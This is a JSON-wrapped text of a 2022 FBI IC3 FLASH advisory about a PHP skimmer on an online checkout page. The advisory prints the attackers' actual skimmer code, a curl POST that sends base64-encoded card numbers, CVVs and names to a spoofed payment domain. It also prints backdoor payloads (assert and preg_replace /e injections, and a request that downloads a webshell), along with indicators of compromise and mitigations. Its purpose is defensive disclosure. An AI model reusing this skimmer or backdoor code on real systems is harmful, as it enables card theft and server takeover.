@@ -1,0 +1,98 @@
+[
+ {
+  "id": "p1",
+  "text": "# Cyber Actors Scrape Credit Card Data from US Business' Online Checkout Page and Maintain Persistence by Injecting Malicious PHP Code"
+ },
+ {
+  "id": "p2",
+  "text": "> - Publisher: FBI Internet Crime Complaint Center (IC3), CSA listing\n> - Date: 2022-05-16\n> - URL: https://www.ic3.gov/CSA/2022/220516.pdf\n> - PDF SHA-256: 8d576d538bb1cc0da296dfe6d633a968a16e74c3781bca243915c4dc830c3ae5 (`source.pdf`, 7 pages)\n> - Rights: published by U.S. government agencies (FBI IC3 copy); rule scan in `reports/eval/build_corpus.py` found no non-US copyright or licence notice. Some are joint advisories with non-US co-authors; public-domain status of co-authored parts not determined.\n> - Text: `pdftotext -layout` output; only page furniture removed by `reports/eval/build_corpus.py` (12 lines). No other edits."
+ },
+ {
+  "id": "p3",
+  "text": "16 May 2022                The following information is being provided by the FBI, with no guarantees or warranties, for potential\n                           use at the sole discretion of recipients to protect against cyber threats. This data is provided in order\n  FLASH Number             to help cyber security professionals and system administrators to guard against the persistent malicious\n                           actions of cyber actors. This FLASH was coordinated with DHS/CISA.\nMC-000170-MW               This FLASH has been released TLP:WHITE"
+ },
+ {
+  "id": "p4",
+  "text": "WE NEED YOUR HELP! If you identify any suspicious activity within your enterprise or have related information,\n     please contact your local FBI Cyber Squad immediately with respect to the procedures outlined in the\n                                    Reporting Notice section of this message.\n      *Note: By reporting any related information to FBI Cyber Squads, you are assisting in sharing information that allows the FBI to track\n       malicious actors and coordinate with private industry and the United States Government to prevent future intrusions and attacks."
+ },
+ {
+  "id": "p5",
+  "text": "Cyber Actors Scrape Credit Card Data from US Business’\n       Online Checkout Page and Maintain Persistence by\n       Injecting Malicious PHP Code"
+ },
+ {
+  "id": "p6",
+  "text": "Summary\n       As of January 2022, unidentified cyber actors unlawfully scraped credit card data from a US\n       business by injecting malicious PHP Hypertext Preprocessor (PHP) code into the business’ online\n       checkout page and sending the scraped data to an actor-controlled server that spoofed a\n       legitimate card processing server. The unidentified cyber actors also established backdoor\n       access to the victim’s system by modifying two files within the checkout page. The FBI has\n       identified and is sharing new indicators of compromise (IOCs), which may assist in network\n       defense."
+ },
+ {
+  "id": "p7",
+  "text": "Technical Details\nUnidentified cyber actors began targeting a US business in September 2020 from three Internet\nprotocol (IP) addresses: 80.249.207.19, 80.82.64.211, and 80.249.206.197. The\nactors inserted malicious PHP code into the business’s customized online checkout page,\ncheckout.php, by altering the associated TempOrders.php file. The checkout page was\nmodified with the following include()statement:\n                  include(“includes/cart_required_files.php”)\n                                  Figure 1: Example include() statement"
+ },
+ {
+  "id": "p8",
+  "text": "include()statements allow developers to import PHP code from one file into another file,\nwhich decreases the number of files developers must modify to update their code. Malicious\nactors exploited this capability to insert the contents of TempOrders.php into the checkout\ncart_required_files.php file. This cart_required_files.php file contained\na require_once() statement that is nearly identical to the include() statement, except\nthat if the identified file cannot be found, a warning is shown and program execution continues.\n               require_once(“$root/cart/config/TempOrders.php”)\n                                Figure 2: Example “require_once” function"
+ },
+ {
+  "id": "p9",
+  "text": "As of January 2022, the unidentified cyber actors used the require_once() function to call\nand execute the TempOrders.php file, which contained code used to scrape and exfiltrate\ncustomer data from the US business’ shopping cart to a victim-specific PHP file\n“file_name.php”:\n $curl = curl_init();\n        curl_setopt($curl, CURLOPT_URL,\n 'http://authorizen.net/file_name.php');\n        curl_setopt($curl, CURLOPT_POST, true);\n        curl_setopt($curl, CURLOPT_POSTFIELDS,\n \"data=\".base64_encode($_POST['cc'].\"|\".$_POST['exp'].\"|\".$_POST['cvv'\n ].\"|\".$_POST['name'].\"|\".$var[XXX].\"|\".$var[XXX].\"|\".$var[XXX].\"|\".$v\n ar[XXX].\"|\".$var[XXX].\"|\".$var[XXX]));\n        $out = curl_exec($curl);\n        curl_close($curl);\n                 Figure 3: Example code from TempOrders.php file identified on victim host"
+ },
+ {
+  "id": "p10",
+  "text": "The malicious code posts the customer’s payment information to a spoofed card processing\ndomain, http://authorizen[.]net/, where the ‘n’ is added to impersonate or spoof\nhttp://authorize[.]net/, a legitimate card processing company’s domain. The\nunidentified cyber actors also established backdoor access to the business’ system by modifying\ntwo files."
+ },
+ {
+  "id": "p11",
+  "text": "First, the actors established a rudimentary back door by inserting the\nassert($_REQUEST['login']) function. This function is designed for debugging and\nwhen called executes code submitted as the HTTP request parameter “login”. Upon execution,\nthe system downloads a fully functional P.A.S. webshell onto the affected company’s\nwebserver.\n http://www.company.com/legit.php?login=system(curl -O\n https://raw.githubusercontetn.com//cr1f/P.A.S.-\n Fork/main/file_name.php’)\n                       Figure 4: Example of code used to establish a rudimentary back door"
+ },
+ {
+  "id": "p12",
+  "text": "Second, the actors inserted the PHP regular expression\n@preg_replace(\"/f/e\",$_GET['u'],\"fengjiao\"), which is designed to insert and\nexecute PHP code submitted as an HTTP request variable named “u”.\n http://www.company.com/otherLegitFile.php?u=system('ls -la;')\n              Figure 5: Example of HTTP request used to execute PHP code and enable the back door"
+ },
+ {
+  "id": "p13",
+  "text": "Using the described techniques, the actors downloaded two PHP Webshells, P.A.S. and b374,\nwhich were leveraged as backdoors for further exploitation."
+ },
+ {
+  "id": "p14",
+  "text": "Indicators\nThe following Internet Protocol (IP) addresses and Uniform Resource Locators (URLs) were used\nduring vulnerability exploitation and/or data exfiltration:\n IP Addresses                                            Uniform Resource Locators (URLs)\n 80.249.207.19                                           N/A\n 80.82.64.211                                            N/A\n 80.249.206.197                                          N/A"
+ },
+ {
+  "id": "p15",
+  "text": "The following malware tools were used during the captioned intrusion:\n Filename       pas.php\n MD5:           73B4EF0EDA0BF07EF4DC1C543F668018\n SHA256:        Ac28e5f136e9307d965466f77cf0845dc4cf08a701323ab4fbc66d91b28cfab9\n SHA1:          6f81a02b802d17e9dc7fc846eb1ce8f14e10b813\n File Size:     15.68 KB (16059 bytes)\n File Type:     Unknown\n Note:          P.A.S. webshell (aka Fobushell) was developed and published by Ukrainian\n                developer Jaroslav Volodimirovich Panchenko (aka Profexer). In December 2016,\n                the Department of Homeland Security published a report concerning attacks on\n                the 2016 U.S. elections, which identified P.A.S. as a tool used by Russian\n                Intelligence Services (referenced by the DHS as “GRIZZLY STEPPE”)."
+ },
+ {
+  "id": "p16",
+  "text": "Filename     log.php\n MD5:         0D43648311AC978702538CF1AC4E1257\n SHA256:      9a0023406283d9856b07b2d39b4444130001f86131841df2eba206f0ae379b6c\n SHA1:        595ce84634536b3a2cc0d6dd05af7003ce8ed04a\n File Size:   97.23 KB (99559 bytes)\n File Type:   PHP\n Note:        This was a webshell published at Github.com/b374k/b374k."
+ },
+ {
+  "id": "p17",
+  "text": "Filename     Index.php\n MD5:         05A7373DAA77917128535C76B2B363FE\n SHA256:      0b754dee14703b23b97dbb50baa5b83931003f0744822eb6a76b0291fb1e6587\n SHA1:        5d46d944af2a9dda829a653856c7ea9ec723dfc5\n File Size:   206.25 KB (211204 bytes)\n File Type:   unknown\n Note:        Adminer is a legitimate PHP-based database tool. This tool is commonly used for\n              managing content in MySQL databases, but it should not be exposed to the\n              public as a general security practice."
+ },
+ {
+  "id": "p18",
+  "text": "PHP Code: The PHP code below is an example of how the unidentified cyber actors modified\nthe target company’s code. The first three lines, beginning with “$this”, are actual code from\nthe company’s shopping cart, and the remaining lines, beginning with “curl” were added by the\nactors.\n $this->streamAccess=$var[XXX];\n $this->username=$var[XXX];\n $this->originalZip=$var[XXX];\n $curl = curl_init();\n curl_setopt($curl, CURLOPT_URL, 'http://authorizen.net/\n file_name.php');\n curl_setopt($curl, CURLOPT_POST, true);\n curl_setopt($curl, CURLOPT_POSTFIELDS,\n \"data=\".base64_encode($_POST['cc'].\"|\".$_POST['exp'].\"|\".$_POST['cvv'\n ].\"|\".$_POST['name'].\"|\".$var[XXX].\"|\".\n $var[XXX].\"|\".$var[XXX].\"|\".$var[XXX].\"|\".$var[XXX $out =\n curl_exec($curl);\n curl_close($curl);\n }\n }\n                    Figure 6: Example of code used to modify the target’s shopping cart"
+ },
+ {
+  "id": "p19",
+  "text": "Recommended Mitigations:\n      Update and patch all systems, to include operating systems, software, and any third-\n       party code running as part of your website."
+ },
+ {
+  "id": "p20",
+  "text": "   Change default login credentials on all systems.\n      Monitor requests performed against your e-commerce environment to identify possible\n       malicious activity.\n      Segregate and segment network systems to limit how easily cyber criminals can move\n       from one to another.\n      Secure all websites transferring sensitive information by using secure socket layer (SSL)\n       protocol.\n      Install third-party software/hardware from trusted sources. Coordinate with the\n       manufacturer to ensure their security protocols prevent unauthorized access to data\n       they store and/or process.\n      Patch all systems for critical vulnerabilities, prioritizing timely patching of internet-\n       connected servers for known vulnerabilities and software processing internet data, such\n       as web browsers, browser plugins, and document readers.\n      Actively scan and monitor web logs and web applications for unauthorized access,\n       modification, and anomalous activities.\n      Strengthen credential requirements and implement multifactor authentication to\n       protect individual accounts.\n      Conduct regular backups to reduce recovery time in the event of a compromise or cyber\n       intrusion.\n      Maintain an updated Incident Response Plan addressing cyber threat response."
+ },
+ {
+  "id": "p21",
+  "text": "Reporting Notice\nThe FBI encourages recipients of this document to report information concerning suspicious or\ncriminal activity to their local FBI field office. With regards to specific information that appears\nin this communication; the context, individual indicators, particularly those of a non-\ndeterministic or ephemeral nature (such as filenames or IP addresses), may not be indicative of\na compromise. Indicators should always be evaluated in light of your complete information\nsecurity situation."
+ },
+ {
+  "id": "p22",
+  "text": "Field office contacts can be identified at www.fbi.gov/contact-us/field-offices. When available,\neach report submitted should include the date, time, location, type of activity, number of\npeople, and type of equipment used for the activity, the name of the submitting company or\norganization, and a designated point of contact."
+ },
+ {
+  "id": "p23",
+  "text": "Administrative Note\nThis product is marked TLP:WHITE. Subject to standard copyright rules, the information in this product\nmay be shared without restriction."
+ },
+ {
+  "id": "p24",
+  "text": "Your Feedback Regarding this Product is Critical\nWas this product of value to your organization? Was the content clear and concise?\nYour comments are very important to us and can be submitted anonymously. Please take a\nmoment to complete the survey at the link below. Feedback should be specific to your\nexperience with our written products to enable the FBI to make quick and continuous\nimprovements to such products. Feedback may be submitted online here:\nhttps://www.ic3.gov/PIFSurvey\nPlease note that this survey is for feedback on content and value only. Reporting of technical\ninformation regarding FLASH reports must be submitted through your local FBI Field Office."
+ }
+]
